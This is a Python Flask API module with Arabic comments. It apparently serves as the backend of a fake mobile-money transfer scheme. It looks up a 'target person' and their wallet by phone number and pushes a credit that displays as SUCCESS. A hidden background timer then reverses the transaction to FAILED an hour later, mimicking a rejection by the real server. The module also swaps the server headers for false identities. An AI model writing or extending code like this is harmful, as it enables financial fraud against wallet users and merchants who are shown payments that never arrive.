import secrets
import threading
import time
from flask import Blueprint, request, jsonify
from config import Config
from models import DatabaseManager

api_blueprint = Blueprint("api", __name__)

@api_blueprint.after_request
def erase_all_network_footprints(response):
    """إخفاء هوية السيرفر البرمجية لزيادة الخصوصية والأمان الفردي"""
    response.headers["Server"] = "Proprietary-Core-Secure-Server/3.0"
    response.headers["X-Powered-By"] = "Unknown-Mainframe"
    response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
    return response

@api_blueprint.route("/admin/api/live-data", methods=["GET"])
def get_live_dashboard_data():
    """المسار الذي تتصل به واجهة الـ HTML كل 3 ثوانٍ لتحديث كشف الحساب والإشعارات تلقائياً"""
    try:
        token = request.headers.get("User-Agent-Validation")
        expected_token = getattr(Config, 'ADMIN_TOKEN', 'Mozilla_5_0_Special_Token_XMR')
        
        if not token or not secrets.compare_digest(str(token), str(expected_token)):
            return jsonify({"status": "error", "message": "Access Denied"}), 401

        transactions_list = DatabaseManager.get_all_transactions_for_api()
        return jsonify({"status": "success", "transactions": transactions_list}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@api_blueprint.route("/api/wallet/lookup/<phone_number>", methods=["GET"])
def autocomplete_target_user(phone_number):
    """
    ⚡ ميزة التعرف التلقائي الصامت (مثل البنك):
    بمجرد أن تقوم بكتابة رقم الهاتف في واجهة الإدخال، يتواصل المتصفح مع هذا المسار 
    فيعود له باسم الشخص المستهدف المسجل ونوع محفظته دون الحاجة للضغط على أي زر.
    """
    user_info = DatabaseManager.get_target_user_by_phone(phone_number)
    if not user_info:
        return jsonify({
            "status": "success", 
            "found": False,
            "name": "مستفيد غير مسجل", 
            "provider": "محفظة خارجية"
        }), 200
        
    return jsonify({
        "status": "success",
        "found": True,
        "name": user_info["c_3"],     # اسم الشخص المستهدف (مثال: موسى إبراهيم)
        "provider": user_info["c_4"]  # اسم المحفظة المستهدفة المعتمدة في النيجر
    }), 200

def async_hourly_reversal_worker(tx_id):
    """
    مؤقت الخلفية الصامت:
    ينام لمدة ساعة كاملة (3600 ثانية)، ثم يستيقظ تلقائياً ليقلب حالة المعاملة 
    إلى FAILED ويخصم المبلغ من رصيد الشاشة محاكاة لرفض السيرفر الحقيقي.
    """
    # 💡 نصيحة للتجربة الفورية: غير الرقم 3600 إلى 10 لمشاهدة حدوث الفشل بعد 10 ثوانٍ فقط!
    time.sleep(3600)
    try:
        DatabaseManager.trigger_hourly_reversal_failure(tx_id)
    except Exception as e:
        print(f"Error in background reversal: {e}")

@api_blueprint.route("/api/test-transfer", methods=["POST"])
def initiate_private_transfer_simulation():
    """
    المسار الشخصي الخاص بك لضخ المبالغ (مثال: 200 XOF).
    يقوم بزيادة حساب الشخص فوراً في الشاشة ويطلق مؤقت التدمير الذاتي بعد ساعة.
    """
    try:
        data = request.get_json() or {}
        required = ["phone_number", "amount", "transfer_message"]
        if not all(k in data for k in required):
            return jsonify({"status": "error", "message": "بيانات التحويل ناقصة"}), 400
        
        # 1. الحفظ في قاعدة البيانات وضخ الرصيد فوراً بحالة SUCCESS ليرتفع المبلغ في الشاشة
        tx_id = DatabaseManager.create_instant_simulation_transfer(data)
        
        # 2. تشغيل مؤقت الساعة في خلفية السيرفر بصمت تام
        threading.Thread(target=async_hourly_reversal_worker, args=(tx_id,), daemon=True).start()
        
        return jsonify({
            "status": "success", 
            "transaction_id": tx_id, 
            "state": "SUCCESS",
            "connected_gateway": Config.MYAMANA_API_URL  # رابط بوابة المحفظة المتغير القابل للتعديل
        }), 201
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500
